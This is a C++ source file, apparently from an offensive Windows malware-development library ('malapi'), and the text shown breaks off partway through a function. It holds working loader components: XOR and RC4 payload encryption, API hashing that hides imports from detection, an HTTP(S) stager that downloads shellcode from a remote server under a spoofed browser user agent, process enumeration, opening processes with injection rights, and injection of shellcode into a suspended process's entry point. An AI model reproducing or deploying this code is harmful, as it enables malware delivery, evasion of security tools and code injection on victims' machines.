#include "malapi.hpp"

namespace malapi
{
	////////////////////////////
   //                        //
  //      Cryptography      //
 //                        //
////////////////////////////

	VOID NONE(_Inout_ BYTE* Input, _In_ SIZE_T InputLen, _In_ BYTE* Key, _In_ SIZE_T KeyLen)
	{
		return;
	}

	VOID XOR(_Inout_ BYTE* Input, _In_ SIZE_T InputLen, _In_ BYTE* Key, _In_ SIZE_T KeyLen)
	{
		for (SIZE_T i = 0; i < InputLen; i++)
			Input[i] ^= Key[i % KeyLen];
		return;
	}

	VOID RC4(_Inout_ BYTE* Input, _In_ SIZE_T InputLen, _In_ BYTE* Key, _In_ SIZE_T KeyLen)
	{
		BYTE S[256];
		BYTE T[256];

		for (int i = 0; i < 256; i++)
		{
			S[i] = i;
			T[i] = Key[i % KeyLen];
		}

		int j = 0;
		for (int i = 0; i < 256; i++)
		{
			j = (j + S[i] + T[i]) % 256;
			BYTE temp = S[i];
			S[i] = S[j];
			S[j] = temp;
		}

		int i = 0;
		j = 0;
		for (SIZE_T k = 0; k < InputLen; k++)
		{
			i = (i + 1) % 256;
			j = (j + S[i]) % 256;
			BYTE temp = S[i];
			S[i] = S[j];
			S[j] = temp;
			BYTE K = S[(S[i] + S[j]) % 256];
			Input[k] ^= K;
		}
		return;
	}

	/////////////////////////////
   //                         //
  //      Functionality      //
 //                         //
/////////////////////////////

	//
	// GetModuleHandle implementation with API hashing.
	//
	HMODULE GetModuleHandleC(_In_ ULONG dllHash)
	{
		// https://revers.engineering/custom-getprocaddress-and-getmodulehandle-implementation-x64/
#if defined(_WIN64)
#define peb_offset 0x60
#define ldr_offset 0x18
#define list_offset 0x10
#define readword(offset) __readgsqword(offset)
#elif defined(_WIN32)
#define peb_offset 0x30
#define ldr_offset 0x0C
#define list_offset 0x0C
#define readword(offset) __readfsdword(offset)
#endif

		PLIST_ENTRY head = (PLIST_ENTRY) & ((PPEB)readword(peb_offset))->Ldr->InMemoryOrderModuleList;
		PLIST_ENTRY next = head->Flink;

		PLDR_MODULE module = (PLDR_MODULE)((PBYTE)next - list_offset);

		while (next != head)
		{
			module = (PLDR_MODULE)((PBYTE)next - list_offset);
			if (module->BaseDllName.Buffer != NULL)
			{
				if (dllHash - HashStringFowlerNollVoVariant1a(module->BaseDllName.Buffer) == 0)
					return (HMODULE)module->BaseAddress;
			}
			next = next->Flink;
		}

		return NULL;
	}

	//
	// GetProcAddress implementation with API hashing.
	//
	FARPROC GetProcAddressC(_In_ HMODULE dllBase, _In_ ULONG funcHash)
	{
		PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)(dllBase);
#if _WIN64
		PIMAGE_NT_HEADERS64 nt = (PIMAGE_NT_HEADERS64)((PBYTE)dos + (dos)->e_lfanew);
#else
		PIMAGE_NT_HEADERS32 nt = (PIMAGE_NT_HEADERS32)(dos + (dos)->e_lfanew);
#endif
		PIMAGE_EXPORT_DIRECTORY exports = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)dos + (nt)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

		if (exports->AddressOfNames != 0)
		{
			PWORD ordinals = (PWORD)((UINT_PTR)dllBase + exports->AddressOfNameOrdinals);
			PDWORD names = (PDWORD)((UINT_PTR)dllBase + exports->AddressOfNames);
			PDWORD functions = (PDWORD)((UINT_PTR)dllBase + exports->AddressOfFunctions);

			for (DWORD i = 0; i < exports->NumberOfNames; i++) {
				LPCSTR name = (LPCSTR)((UINT_PTR)dllBase + names[i]);
				if (HashStringFowlerNollVoVariant1a(name) == funcHash) {
					PBYTE function = (PBYTE)((UINT_PTR)dllBase + functions[ordinals[i]]);
					return (FARPROC)function;
				}
			}
		}
		return NULL;
	}

	HMODULE LoadLibraryC(_In_ LPCSTR library_path)
	{
		HMODULE kernel32 = NULL;

		constexpr DWORD hash_kernel32 = HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
		constexpr DWORD hash_loadlibrarya = HashStringFowlerNollVoVariant1a("LoadLibraryA");

		kernel32 = GetModuleHandleC(hash_kernel32);
		if (!kernel32) return NULL;

		typeLoadLibraryA LoadLibraryA = (typeLoadLibraryA)GetProcAddressC(kernel32, hash_loadlibrarya);

		return LoadLibraryA(library_path);
	}

	//
	// Uses NtQuerySystemInformation to enumerate processes and find the first occurance in the hashlist.
	// Returns NULL on failure.
	//
	DWORD GetPidFromHashedList(_In_ DWORD* HashList, _In_ SIZE_T EntryCount)
	{
		constexpr DWORD hash_ntdll = HashStringFowlerNollVoVariant1a("ntdll.dll");
		constexpr DWORD hash_ntquerysysteminformation = HashStringFowlerNollVoVariant1a("NtQuerySystemInformation");

		HMODULE ntdll = GetModuleHandleC(hash_ntdll);
		if (!ntdll) return NULL;
		typeNtQuerySystemInformation NtQuerySystemInformation = (typeNtQuerySystemInformation)GetProcAddressC(ntdll, hash_ntquerysysteminformation);
		if (!NtQuerySystemInformation) return NULL;

		DWORD pid = NULL, returnlength = 0, nextoffset = 0, name_hash = 0;
		PSYSTEM_PROCESS_INFORMATION process = NULL, processinfoptr = NULL;
		NTSTATUS status = STATUS_SUCCESS;

		// Get size of systemprocessinformation
		NtQuerySystemInformation(SYSTEM_INFORMATION_CLASS::SystemProcessInformation, NULL, 0, &returnlength);
		returnlength += 0x10000;
		if (returnlength == 0)
			return NULL;

		process = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(returnlength);
		if (!process) return NULL;

		status = NtQuerySystemInformation(SystemProcessInformation, process, returnlength, &returnlength);
		if (!NT_SUCCESS(status))
			goto CLEANUP;

		processinfoptr = process;
		do
		{
			if (processinfoptr->ImageName.Buffer)
			{
				name_hash = HashStringFowlerNollVoVariant1a(processinfoptr->ImageName.Buffer);
				for (size_t i = 0; i < EntryCount; i++)
				{
					if (HashList[i] == name_hash)
					{
						pid = (DWORD)(UINT_PTR)processinfoptr->UniqueProcessId;
						break;
					}
				}
			}

			processinfoptr = (PSYSTEM_PROCESS_INFORMATION)(((PBYTE)processinfoptr) + processinfoptr->NextEntryOffset);
		} while (processinfoptr->NextEntryOffset);

	CLEANUP:
		if (process)
			HeapFree(process);

		return pid;
	}

	//
	// Uses OpenProcess to get a handle to the process from a given PID
	// Returns NULL on failure.
	//
	HANDLE GetProcessHandle(DWORD process_id)
	{
		HANDLE process = INVALID_HANDLE_VALUE;
		constexpr DWORD hash_krn32 = HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
		constexpr DWORD hash_openprocess = HashStringFowlerNollVoVariant1a("OpenProcess");

		HMODULE kernel32 = GetModuleHandleC(hash_krn32);
		if (!kernel32) return NULL;

		typeOpenProcess OpenProcessC = (typeOpenProcess)GetProcAddressC(kernel32, hash_openprocess);
		if (!OpenProcessC)
		{
			LOG_ERROR("GetProcAddress failed to get OpenProcess.");
			return NULL;
		}
		process = OpenProcessC((PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_SET_QUOTA), FALSE, process_id);

		LOG_SUCCESS("Process Handle: 0x%08lX", process);

		return process;
	}

	//
	// String compare implementation (ascii).
	//
	INT StringCompare(_In_ LPCSTR String1, _In_ LPCSTR String2)
	{
		for (; *String1 == *String2; String1++, String2++)
		{
			if (*String1 == '\0')
				return 0;
		}

		return ((*(LPCSTR)String1 < *(LPCSTR)String2) ? -1 : +1);
	}
	//
	// String compare implementation (wchar).
	//
	INT StringCompare(_In_ LPCWSTR String1, _In_ LPCWSTR String2)
	{
		for (; *String1 == *String2; String1++, String2++)
		{
			if (*String1 == '\0')
				return 0;
		}

		return ((*(LPCWSTR)String1 < *(LPCWSTR)String2) ? -1 : +1);
	}

	//
	// Secure strcpy implementation (ascii).
	//
	PCHAR SecureStringCopy(_Inout_ PCHAR String1, _In_ LPCSTR String2, _In_ SIZE_T Size)
	{
		PCHAR pChar = String1;

		while (Size-- && (*String1++ = *String2++) != '\0');

		return pChar;
	}
	//
	// Secure strcpy implementation (wchar).
	//
	PWCHAR SecureStringCopy(_Inout_ PWCHAR String1, _In_ LPCWSTR String2, _In_ SIZE_T Size)
	{
		PWCHAR pChar = String1;

		while (Size-- && (*String1++ = *String2++) != '\0');

		return pChar;
	}

	//
	// String copy implementation (ascii).
	//
	PCHAR StringCopy(_Inout_ PCHAR String1, _In_ LPCSTR String2)
	{
		PCHAR p = String1;

		while ((*p++ = *String2++) != 0);

		return String1;
	}
	//
	// String copy implementation (wchar).
	//
	PWCHAR StringCopy(_Inout_ PWCHAR String1, _In_ LPCWSTR String2)
	{
		PWCHAR p = String1;

		while ((*p++ = *String2++) != 0);

		return String1;
	}

	//
	// Uses GetFileAttributesA to check if a file exists, returns TRUE if it does.
	//
	BOOL CheckFileExists(_In_ LPCSTR FullPath)
	{
		constexpr DWORD hash_kernel32 = HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
		constexpr DWORD hash_getfileattributes = HashStringFowlerNollVoVariant1a("GetFileAttributes");

		HMODULE kernel32 = GetModuleHandleC(hash_kernel32);
		if (!kernel32) return NULL;
		typeGetFileAttributesA _GetFileAttributesA = (typeGetFileAttributesA)GetProcAddressC(kernel32, hash_getfileattributes);
		if (!_GetFileAttributesA) return NULL;

		DWORD attribs = _GetFileAttributesA(FullPath);
		return (attribs != INVALID_FILE_ATTRIBUTES) && !(attribs & FILE_ATTRIBUTE_DIRECTORY);
	}

	//
	// Uses GetProcessImageFileName to get the file path from a Process Handle
	//
	LPSTR GetFilePathA(void)
	{
		LPSTR file_path = (LPSTR)HeapAlloc(MAX_PATH * sizeof(CHAR));
		DWORD file_size = 0;

		const ULONG hash_kernel32 = HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
		const ULONG hash_getmodulefilenamea = HashStringFowlerNollVoVariant1a("GetModuleFileNameA");
		const ULONG hash_getlasterror = HashStringFowlerNollVoVariant1a("GetLastError");

		HMODULE kernel32 = GetModuleHandleC(hash_kernel32);
		if (!kernel32) return NULL;

		typeGetLastError GetLastError = (typeGetLastError)GetProcAddressC(kernel32, hash_getlasterror);
		typeGetModuleFileNameA GetModuleFileNameA = (typeGetModuleFileNameA)GetProcAddressC(kernel32, hash_getmodulefilenamea);

		file_size = GetModuleFileNameA(NULL, file_path, MAX_PATH);
		if (!file_size)
		{
			LOG_ERROR("Unable to get File Path. (Code: %016llX)", GetLastError());
			HeapFree(file_path);
			return NULL;
		}

		LOG_INFO("File Path: %s", file_path);
		return file_path;
	}

	LPWSTR GetFilePathW(void)
	{
		LPWSTR file_path = (LPWSTR)HeapAlloc(MAX_PATH * sizeof(WCHAR));
		DWORD file_size = 0;

		const ULONG hash_kernel32 = HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
		const ULONG hash_getmodulefilenamew = HashStringFowlerNollVoVariant1a("GetModuleFileNameW");
		const ULONG hash_getlasterror = HashStringFowlerNollVoVariant1a("GetLastError");

		HMODULE kernel32 = GetModuleHandleC(hash_kernel32);
		if (!kernel32) return NULL;

		typeGetLastError GetLastError = (typeGetLastError)GetProcAddressC(kernel32, hash_getlasterror);
		typeGetModuleFileNameW GetModuleFileNameW = (typeGetModuleFileNameW)GetProcAddressC(kernel32, hash_getmodulefilenamew);

		file_size = GetModuleFileNameW(NULL, file_path, MAX_PATH);
		if (!file_size)
		{
			LOG_ERROR("Unable to get File Path. (Code: %016llX)", GetLastError());
			HeapFree(file_path);
			return NULL;
		}

		LOG_INFO("File Path: %ls", file_path);
		return file_path;
	}

	//
	// Deletes a file using the full file path
	//
	BOOL DeleteFileA(LPCSTR file_path)
	{
		const ULONG hash_kernel32 = HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
		const ULONG hash_deletefilea = HashStringFowlerNollVoVariant1a("DeleteFileA");
		const ULONG hash_getlasterror = HashStringFowlerNollVoVariant1a("GetLastError");

		HMODULE kernel32 = GetModuleHandleC(hash_kernel32);

		typeDeleteFileA DeleteFileA = (typeDeleteFileA)GetProcAddressC(kernel32, hash_deletefilea);
		typeGetLastError GetLastError = (typeGetLastError)GetProcAddressC(kernel32, hash_getlasterror);

		BOOL success = DeleteFileA(file_path);
		if (!success)
		{
			LOG_ERROR("Unable to delete file. (Code: %016llX)", GetLastError());
			return success;
		}
		LOG_SUCCESS("Successfully deleted file!");
		return success;
	}

	BOOL DeleteFileW(LPCWSTR file_path)
	{
		const ULONG hash_kernel32 = HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
		const ULONG hash_deletefilew = HashStringFowlerNollVoVariant1a("DeleteFileW");
		const ULONG hash_getlasterror = HashStringFowlerNollVoVariant1a("GetLastError");

		HMODULE kernel32 = GetModuleHandleC(hash_kernel32);

		typeDeleteFileW DeleteFileW = (typeDeleteFileW)GetProcAddressC(kernel32, hash_deletefilew);
		typeGetLastError GetLastError = (typeGetLastError)GetProcAddressC(kernel32, hash_getlasterror);

		BOOL success = DeleteFileW(file_path);
		if (!success)
		{
			LOG_ERROR("Unable to delete file. (Code: %016llX)", GetLastError());
			return success;
		}
		LOG_SUCCESS("Successfully deleted file!");
		return success;
	}

	///////////////////////
   //                   //
  //      Staging      //
 //                   //
///////////////////////

	//
	// Stage Shellcode to Memory via HTTPS
	// Requires Valid SSL Certificate if using HTTPS
	//
	// Returns Shellcode & Shellcode Size
	//
	BOOL StageShellcodeHttp(_In_ LPCWSTR base_url, _In_ LPCWSTR uri_path, _In_ BOOL ssl_enabled, _Out_ PBYTE* shellcode, _Out_ SIZE_T* shellcode_size)
	{
		BOOL success = FALSE;
		HMODULE kernel32 = NULL;
		HMODULE winhttp = NULL;
		*shellcode = NULL;
		*shellcode_size = 0;

		LPCWSTR user_agent = L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 GLS/100.10.9939.100 ABLELDR/1.1";
		DWORD bytes_read = 0;
		DWORD resp_size = 0;
		PBYTE resp_buffer = NULL;
		CHAR* resp_chunk[1024] = { 0 };

		HINTERNET session = NULL;
		HINTERNET connect = NULL;
		HINTERNET request = NULL;

#pragma region Imports

		typeWinHttpOpen WinHttpOpenC = NULL;
		typeWinHttpConnect WinHttpConnectC = NULL;
		typeWinHttpSendRequest WinHttpSendRequestC = NULL;
		typeWinHttpOpenRequest WinHttpOpenRequestC = NULL;
		typeWinHttpReceiveResponse WinHttpReceiveResponseC = NULL;
		typeWinHttpReadData WinHttpReadDataC = NULL;
		typeWinHttpCloseHandle WinHttpCloseHandleC = NULL;

		typeGetLastError GetLastErrorC = NULL;

		constexpr ULONG hash_kernel32 = HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
		constexpr ULONG hash_getlasterror = HashStringFowlerNollVoVariant1a("GetLastError");

		constexpr ULONG hash_winhttpopen = HashStringFowlerNollVoVariant1a("WinHttpOpen");
		constexpr ULONG hash_winhttpconnect = HashStringFowlerNollVoVariant1a("WinHttpConnect");
		constexpr ULONG hash_winhttpsendrequest = HashStringFowlerNollVoVariant1a("WinHttpSendRequest");
		constexpr ULONG hash_winhttpopenrequest = HashStringFowlerNollVoVariant1a("WinHttpOpenRequest");
		constexpr ULONG hash_winhttpreceiveresponse = HashStringFowlerNollVoVariant1a("WinHttpReceiveResponse");
		constexpr ULONG hash_winhttpreaddata = HashStringFowlerNollVoVariant1a("WinHttpReadData");
		constexpr ULONG hash_winhttpclosehandle = HashStringFowlerNollVoVariant1a("WinHttpCloseHandle");

		kernel32 = GetModuleHandleC(hash_kernel32);

		winhttp = LoadLibraryC("Winhttp.dll");
		//PDARKMODULE winhttp_dll = DarkLoadLibrary(LOAD_LOCAL_FILE, L"C:\\Windows\\System32\\winhttp.dll", NULL, 0, NULL);
		//winhttp = (HMODULE)winhttp_dll->ModuleBase;

		if (!kernel32 || !winhttp) goto CLEANUP;

		WinHttpOpenC = (typeWinHttpOpen)GetProcAddressC(winhttp, hash_winhttpopen);
		WinHttpConnectC = (typeWinHttpConnect)GetProcAddressC(winhttp, hash_winhttpconnect);
		WinHttpSendRequestC = (typeWinHttpSendRequest)GetProcAddressC(winhttp, hash_winhttpsendrequest);
		WinHttpOpenRequestC = (typeWinHttpOpenRequest)GetProcAddressC(winhttp, hash_winhttpopenrequest);
		WinHttpReceiveResponseC = (typeWinHttpReceiveResponse)GetProcAddressC(winhttp, hash_winhttpreceiveresponse);
		WinHttpReadDataC = (typeWinHttpReadData)GetProcAddressC(winhttp, hash_winhttpreaddata);
		WinHttpCloseHandleC = (typeWinHttpCloseHandle)GetProcAddressC(winhttp, hash_winhttpclosehandle);

		GetLastErrorC = (typeGetLastError)GetProcAddressC(kernel32, hash_getlasterror);

#pragma endregion

		session = WinHttpOpenC(user_agent, WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
		if (session == NULL)
		{
			LOG_ERROR("Failed to start session. (Code: %016llX)", GetLastErrorC());
			goto CLEANUP;
		}
		LOG_SUCCESS("Session Started. (Code: %016llX)", session);

		if (ssl_enabled)
		{
			LOG_INFO("Stager Over HTTPS");

			connect = WinHttpConnectC(session, base_url, INTERNET_DEFAULT_HTTPS_PORT, 0);
			if (connect == NULL)
			{
				LOG_ERROR("Failed to connect to web server. (Code: %016llX)", GetLastErrorC());
				goto CLEANUP;
			}
			LOG_SUCCESS("Connected to Session. (Code: %016llX)", connect);

			request = WinHttpOpenRequestC(connect, L"GET", uri_path, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, (WINHTTP_FLAG_REFRESH | WINHTTP_FLAG_SECURE));
			if (request == NULL)
			{
				LOG_ERROR("Failed to open request. (Code: %016llX)", GetLastErrorC());
				goto CLEANUP;
			}
			LOG_SUCCESS("Request Opened For: %ls%ls. (Code: %016llX)", base_url, uri_path, request);
		}
		else
		{
			LOG_INFO("Stager Over HTTP");

			connect = WinHttpConnectC(session, base_url, INTERNET_DEFAULT_HTTP_PORT, 0);
			if (!connect)
			{
				LOG_ERROR("Failed to connect to web server. (Code: %016llX)", GetLastErrorC());
				goto CLEANUP;
			}
			LOG_SUCCESS("Connected to Session. (Code: %016llX)", connect);

			request = WinHttpOpenRequestC(connect, L"GET", uri_path, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, (WINHTTP_FLAG_REFRESH));
			if (request == NULL)
			{
				LOG_ERROR("Failed to open request. (Code: %016llX)", GetLastErrorC());
				goto CLEANUP;
			}
			LOG_SUCCESS("Request Opened For: %ls%ls. (Code: %016llX)", base_url, uri_path, request);

			if (!WinHttpSendRequestC(request, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0))
			{
				LOG_ERROR("Failed to Send Request. (Code: %016llX)", GetLastErrorC());
				goto CLEANUP;
			}
			LOG_SUCCESS("Request Sent");
		}

		if (!WinHttpReceiveResponseC(request, NULL))
		{
			LOG_ERROR("Failed to Receive Response. (Code: %016llX)", GetLastErrorC());
			goto CLEANUP;
		}
		LOG_SUCCESS("Request Received");

		do {
			if (!WinHttpReadDataC(request, resp_chunk, sizeof(resp_chunk), &bytes_read) || bytes_read == 0)
			{
				LOG_INFO("Failed to Read Data or All Data Has Been Read. (Code: %016llX)", GetLastErrorC());
			}

			if (!resp_buffer)
			{
				resp_buffer = (PBYTE)HeapAlloc(bytes_read);
			}
			resp_buffer = (PBYTE)HeapReAlloc(resp_buffer, (resp_size + bytes_read));

			resp_size += bytes_read;

			memcpy(resp_buffer + (resp_size - bytes_read), resp_chunk, bytes_read);
			memset(resp_chunk, 0, 1024);
		} while (bytes_read > 0);

		*shellcode = resp_buffer;
		*shellcode_size = resp_size;

		success = TRUE;
		LOG_SUCCESS("Payload Downloaded Successfully.");

	CLEANUP:
		if (session) WinHttpCloseHandleC(session);
		if (connect) WinHttpCloseHandleC(connect);
		if (request) WinHttpCloseHandleC(request);
		return success;
	}

	///////////////////////////////////
   //                               //
  //      Process Interaction      //
 //                               //
///////////////////////////////////

	//
	// Close a given handle via ntdll.dll!NtClose.
	//
	VOID CloseHandle(_In_ HANDLE Handle)
	{
		constexpr DWORD hash_ntdll = HashStringFowlerNollVoVariant1a("ntdll.dll");
		constexpr DWORD hash_ntclose = HashStringFowlerNollVoVariant1a("NtClose");

		HMODULE ntdll = GetModuleHandleC(hash_ntdll);
		if (!ntdll) return;
		typeNtClose NtClose = (typeNtClose)GetProcAddressC(ntdll, hash_ntclose);

		NtClose(Handle);
	}

	//
	// Wrapper around K32!CreateProcessW.
	//
	HANDLE CreateProcessW(_In_ LPWSTR command_line, _In_ LPWSTR working_directory)
	{
		constexpr DWORD hash_kernel32 = HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
		constexpr DWORD hash_createprocessw = HashStringFowlerNollVoVariant1a("CreateProcessW");

		HMODULE kernel32 = GetModuleHandleC(hash_kernel32);
		if (!kernel32) return NULL;
		typeCreateProcessW CreateProcessW = (typeCreateProcessW)GetProcAddressC(kernel32, hash_createprocessw);

		STARTUPINFOW si = {};
		PROCESS_INFORMATION pi = {};
		si.cb = sizeof(STARTUPINFO);

		// TODO: add macro in malapi.hpp
		ZeroMemoryEx(&si, sizeof(si));
		si.cb = sizeof(si);

		BOOL success = CreateProcessW(
			NULL,
			command_line,
			NULL,
			NULL,
			FALSE,
			0,
			NULL,
			NULL,
			&si,
			&pi
		);

		if (!success) return NULL;

		CloseHandle(pi.hThread);
		return pi.hProcess;
	}

	//
	// Create Suspended Process
	// Return Process Handle & Thread Handle
	//
	BOOL CreateSuspendedProcess(_In_ LPSTR file_path, _Out_ HANDLE* process_handle, _Out_ HANDLE* thread_handle)
	{
		BOOL success = FALSE;
		STARTUPINFOA si = {};
		PROCESS_INFORMATION pi = {};
		HANDLE proc_handle = INVALID_HANDLE_VALUE;
		*process_handle = INVALID_HANDLE_VALUE;
		*thread_handle = INVALID_HANDLE_VALUE;

#pragma region winapi_imports

		constexpr DWORD hash_kernel32 = HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
		constexpr DWORD hash_ntdll = HashStringFowlerNollVoVariant1a("ntdll.dll");
		constexpr DWORD hash_ntcreateuserprocess = HashStringFowlerNollVoVariant1a("NtCreateUserProcess");
		constexpr DWORD hash_createprocessa = HashStringFowlerNollVoVariant1a("CreateProcessA");

		HMODULE kernel32 = GetModuleHandleC(hash_kernel32);
		HMODULE ntdll = GetModuleHandleC(hash_ntdll);
		if (!kernel32) return NULL;

		typeNtCreateUserProcess NtCreateUserProcess = (typeNtCreateUserProcess)GetProcAddressC(kernel32, hash_ntcreateuserprocess);
		typeCreateProcessA CreateProcessC = (typeCreateProcessA)GetProcAddressC(kernel32, hash_createprocessa);

#pragma endregion

		ZeroMemoryEx(&si, sizeof(STARTUPINFOA));
		ZeroMemoryEx(&pi, sizeof(PROCESS_INFORMATION));

		si.cb = sizeof(STARTUPINFOA);

		//success = NtCreateUserProcess(&pi.hProcess, &pi.hThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, NULL, NULL, ProcessParameters, NULL, NULL);
		success = CreateProcessC(0, file_path, 0, 0, 0, (CREATE_NO_WINDOW | CREATE_SUSPENDED), 0, 0, &si, &pi);
		if (!success) return success;

		*process_handle = pi.hProcess;
		*thread_handle = pi.hThread;

		return success;
	}

	//
	// CreateSuspendedProcess and Get Entry Point
	// Return ThreadHandle
	//
	// Based on ired.team & https://bohops.com/2023/06/09/no-alloc-no-problem-leveraging-program-entry-points-for-process-injection/
	//
	HANDLE EntryPointHandle(LPSTR file_path, _In_ BYTE* shellcode, _In_ SIZE_T shellcode_size)
	{
		STARTUPINFOA si = {};
		PROCESS_INFORMATION pi = {};
		PROCESS_BASIC_INFORMATION pbi = {};
		DWORD return_length = 0;
		LPVOID image_base;
		LPVOID code_entry;
		BYTE headers_buffer[4096] = {};

		PIMAGE_DOS_HEADER dos_header = NULL;
		PIMAGE_NT_HEADERS nt_headers = NULL;

#pragma region imports

		constexpr DWORD hash_kernel32 = HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
		constexpr DWORD hash_ntdll = HashStringFowlerNollVoVariant1a("ntdll.dll");
		constexpr DWORD hash_createprocessa = HashStringFowlerNollVoVariant1a("CreateProcessA");
		constexpr DWORD hash_closehandle = HashStringFowlerNollVoVariant1a("CloseHandle");
		constexpr ULONG hash_writeprocessmemory = HashStringFowlerNollVoVariant1a("WriteProcessMemory");
		constexpr ULONG hash_getlasterror = HashStringFowlerNollVoVariant1a("GetLastError");

		constexpr DWORD hash_ntqueryinformationprocess = HashStringFowlerNollVoVariant1a("NtQueryInformationProcess");
		constexpr DWORD hash_ntqueryinformationthread = HashStringFowlerNollVoVariant1a("NtQueryInformationThread");
		constexpr DWORD hash_ntreadvirtualmemory = HashStringFowlerNollVoVariant1a("NtReadVirtualMemory");

		HMODULE kernel32 = GetModuleHandleC(hash_kernel32);
		HMODULE ntdll = GetModuleHandleC(hash_ntdll);
		if (!kernel32 || !ntdll) return NULL;

		typeCreateProcessA CreateProcess = (typeCreateProcessA)GetProcAddressC(kernel32, hash_createprocessa);
		typeCloseHandle CloseHandleC = (typeCloseHandle)GetProcAddressC(kernel32, hash_closehandle);
		typeWriteProcessMemory WriteProcessMemory = (typeWriteProcessMemory)GetProcAddressC(kernel32, hash_writeprocessmemory);
		typeGetLastError GetLastErrorC = (typeGetLastError)GetProcAddressC(kernel32, hash_getlasterror);

		typeNtQueryInformationProcess NtQueryInformationProcessC = (typeNtQueryInformationProcess)GetProcAddressC(ntdll, hash_ntqueryinformationprocess);
		typeNtQueryInformationThread NtQueryInformationThread = (typeNtQueryInformationThread)GetProcAddressC(ntdll, hash_ntqueryinformationthread);
		typeNtReadVirtualMemory NtReadVirtualMemoryC = (typeNtReadVirtualMemory)GetProcAddressC(ntdll, hash_ntreadvirtualmemory);

#pragma endregion

		ZeroMemoryEx(&si, sizeof(STARTUPINFOA));
		ZeroMemoryEx(&pi, sizeof(PROCESS_INFORMATION));
		ZeroMemoryEx(&pbi, sizeof(PROCESS_BASIC_INFORMATION));

		si.cb = sizeof(STARTUPINFOA);

		if (!CreateProcess(0, file_path, 0, 0, 0, (CREATE_NO_WINDOW | CREATE_SUSPENDED), 0, 0, &si, &pi))
		{
			LOG_ERROR("Failed to Create Process. (Code: %016llX)", GetLastErrorC());
			goto CLEANUP;
		}

		LOG_INFO("Process Handle: %p", pi.hProcess);
		LOG_INFO("Thread Handle: %p", pi.hThread);

		if (!NT_SUCCESS(NtQueryInformationThread(pi.hThread, (THREADINFOCLASS)9, &code_entry, sizeof(PVOID), &return_length)))
		{
			LOG_ERROR("Failed to Query Thread Information");
			return INVALID_HANDLE_VALUE;
		}
		LOG_SUCCESS("Thread Address: 0x%016llX", code_entry);

		if (!WriteProcessMemory(pi.hProcess, code_entry, shellcode, shellcode_size, NULL)) LOG_ERROR("Failed to write shellcode to entry point"); goto CLEANUP;
		LOG_SUCCESS("Shellcode written to: %016llX", code_entry);

	CLEANUP:
		return pi.hThread;
	}

	//
	// Returns TEB pointer for current process.
	//
	//
	// Returns PEB pointer for current process. (Retrieved from TEB)
	//
	PTEB GetTEB(void)
	{
		PTEB teb;
#ifdef _WIN64
		teb = reinterpret_cast<PTEB>(__readgsqword(0x30));
#else
		teb = reinterpret_cast<PTEB>(__readfsdword(0x18));
#endif
		return teb;
	}

	//
	// Returns PEB pointer for current process.
	//
	PPEB GetPEB(void)
	{
		PPEB peb;
#ifdef _WIN64
		peb = reinterpret_cast<PPEB>(__readgsqword(0x60));
#else
		peb = reinterpret_cast<PPEB>(__readfsdword(0x30));
#endif
		return peb;
	}

	PPEB GetPEBFromTEB(void)
	{
		PPEB peb;
#ifdef _WIN64
		peb = reinterpret_cast<PTEB>(__readgsqword(0x30))->ProcessEnvironmentBlock;
#else
		peb = reinterpret_cast<PTEB>(__readfsdword(0x18))->ProcessEnvironmentBlock;
#endif
		return peb;
	}

	//
	// Search a region of memory for an egg. Returns NULL on failure.
	//
	PVOID EggHunt(_In_ PVOID RegionStart, _In_ SIZE_T RegionLength, _In_ PVOID Egg, _In_ SIZE_T EggLength)
	{
		if (!RegionStart || !RegionLength || !Egg || !EggLength)
			return NULL;

		for (CHAR* pchar = (CHAR*)RegionStart; RegionLength >= EggLength; ++pchar, --RegionLength)
		{
			if (!memcmp(pchar, Egg, EggLength))
				return pchar;
		}
		return NULL;
	}

	//
	// Gets the process cookie from the PEB
	//
	ULONG GetProcessCookie(void)
	{
		constexpr DWORD hash_ntdll = HashStringFowlerNollVoVariant1a("ntdll.dll");
		constexpr DWORD hash_NtQueryInformationProcess = HashStringFowlerNollVoVariant1a("NtQueryInformationProcess");

		HMODULE ntdll = GetModuleHandleC(hash_ntdll);
		if (!ntdll) return NULL;
		typeNtQueryInformationProcess NtQueryInformationProcess = (typeNtQueryInformationProcess)GetProcAddressC(ntdll, hash_NtQueryInformationProcess);
		if (!NtQueryInformationProcess) return NULL;

		// get process cookie
		ULONG cookie = 0;
		NTSTATUS result = NtQueryInformationProcess((HANDLE)-1, ProcessCookie, &cookie, sizeof(ULONG), NULL);

		return NT_SUCCESS(result) ? cookie : NULL;
	}

	//
	// Returns TRUE if current process token is elevated, otherwise FALSE (including on error).
	//
	BOOL IsProcessRunningAsAdmin(void)
	{
		HANDLE hToken = NULL;
		TOKEN_ELEVATION Elevation = { 0 };
		DWORD dwSize = 0;
		BOOL bFlag = FALSE;
		typeOpenProcessToken pOpenProcessToken;
		typeGetTokenInformation pGetTokenInformation;

		constexpr DWORD hashadvapi = HashStringFowlerNollVoVariant1a("Advapi32.dll");
		constexpr DWORD hashopenprocesstoken = HashStringFowlerNollVoVariant1a("OpenProcessToken");
